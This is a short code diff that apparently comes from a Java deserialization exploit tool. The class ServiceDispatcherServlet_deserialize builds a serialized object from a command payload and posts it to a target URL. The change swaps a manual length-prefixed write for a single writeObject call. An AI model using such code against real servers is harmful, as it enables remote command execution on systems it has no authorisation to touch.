@@ -23,9 +23,7 @@ public class ServiceDispatcherServlet_deserialize {
         Object obj = payload.getObject(cmd);
 
         ByteArrayOutputStream bos = new ByteArrayOutputStream();
-        ByteArrayOutputStream temp = NetObjectOutputStream.convertObjectToBytes(obj, true, true);
-        NetObjectOutputStream.writeInt(bos,temp.toByteArray().length);
-        temp.writeTo(bos);
+        NetObjectOutputStream.writeObject(bos,obj);
 
         HttpRequest httpRequest = new HttpRequest();
         HttpPost httpPost = new HttpPost(url);
